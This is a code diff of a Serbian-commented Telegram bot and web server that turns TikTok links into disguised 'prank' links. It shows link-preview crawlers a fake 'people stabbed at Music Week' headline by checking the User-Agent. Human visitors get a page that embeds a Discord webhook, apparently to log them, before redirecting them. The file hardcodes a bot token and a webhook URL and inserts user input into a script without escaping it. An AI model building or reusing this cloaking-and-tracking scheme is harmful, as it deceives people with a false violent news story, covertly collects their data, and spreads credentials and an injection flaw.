@@ -1,5 +1,5 @@
-import uuid
 import os
+import binascii
 from aiohttp import web
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
@@ -11,21 +11,18 @@ from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_applicati
 API_TOKEN = '8771472343:AAGhpARS8GxMcsbsnt1hKKZhiIltABiQlUA'
 DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1527509467204161567/Q6ilvbIGYe27grr4WTbr6yC1CwVfCMOGn1k4sbTciYzvjr211XXIfMxMqBfzJxcXEgh6'
 
-# TVOJA TAČNA RENDER ADRESA (BEZ KOSE CRTE NA KRAJU!)
-MY_PUBLIC_DOMAIN = 'https://tiktok-varka-2.onrender.com'
+# TVOJA RENDER ADRESA (BEZ KOSE CRTE NA KRAJU!)
+MY_PUBLIC_DOMAIN = 'https://onrender.com'
 
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher()
-
-# Zajednička baza podataka
-db = {}
 
 # =========================================================================
 # 2. TELEGRAM BOT KOD
 # =========================================================================
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
-    await message.answer("Ćao! Pošalji mi bilo koji TikTok link, a ja ću ti napraviti potpuno crnu varku.")
+    await message.answer("Ćao! Pošalji mi bilo koji TikTok link, a ja ću ti napraviti besmrtnu crnu varku.")
 
 @dp.message()
 async def handle_message(message: types.Message):
@@ -35,28 +32,28 @@ async def handle_message(message: types.Message):
         return
         
     await message.answer("Generišem link, sačekaj trenutak...")
-    link_id = str(uuid.uuid4())[:8]
     
-    db[link_id] = {
-        "title": "Izbodeni ljudi na Music Week-u! 😱",
-        "image": "https://unsplash.com",
-        "description": "Pogledaj ceo snimak uživo sa lica mesta...",
-        "tiktok_url": text
-    }
+    # POPRAVLJENO: Pretvaramo URL u HEX (samo mala slova i brojevi)
+    # Render više ne može da pokvari velika i mala slova!
+    string_bytes = text.encode("utf-8")
+    hex_code = binascii.hexlify(string_bytes).decode("utf-8")
     
-    prank_link = f"{MY_PUBLIC_DOMAIN}/l/{link_id}"
+    prank_link = f"{MY_PUBLIC_DOMAIN}/l/{hex_code}"
     await message.answer(f"Evo tvog uverljivog linka:\n\n`{prank_link}`")
 
 # =========================================================================
 # 3. WEB SERVER KOD
 # =========================================================================
 async def serve_link(request):
-    link_id = request.match_info.get('link_id')
+    hex_code = request.match_info.get('link_id')
     
-    if link_id not in db:
-        return web.Response(text="Link ne postoji", status=404)
+    # Dekodiramo originalni TikTok URL iz HEX koda
+    try:
+        string_bytes = binascii.unhexlify(hex_code.encode("utf-8"))
+        pravi_tiktok_url = string_bytes.decode("utf-8")
+    except Exception:
+        return web.Response(text="Link je neispravan", status=400)
         
-    prank_data = db[link_id]
     user_agent = request.headers.get('User-Agent', '')
 
     bot_keywords = ["TelegramBot", "Twitterbot", "facebookexternalhit", "Discordbot"]
@@ -67,9 +64,9 @@ async def serve_link(request):
         <!DOCTYPE html>
         <html>
         <head>
-            <meta property="og:title" content="{prank_data['title']}" />
-            <meta property="og:image" content="{prank_data['image']}" />
-            <meta property="og:description" content="{prank_data['description']}" />
+            <meta property="og:title" content="Izbodeni ljudi na Music Week-u! 😱" />
+            <meta property="og:image" content="https://unsplash.com" />
+            <meta property="og:description" content="Pogledaj ceo snimak uživo sa lica mesta..." />
             <meta property="og:type" content="video.other" />
         </head>
         <body></body>
@@ -90,7 +87,7 @@ async def serve_link(request):
         </head>
         <body>
             <script>
-                const praviTikTok = "{prank_data['tiktok_url']}";
+                const praviTikTok = "{pravi_tiktok_url}";
                 const webhookUrl = "{DISCORD_WEBHOOK_URL}";
 
                 function idiNaTikTok() {{
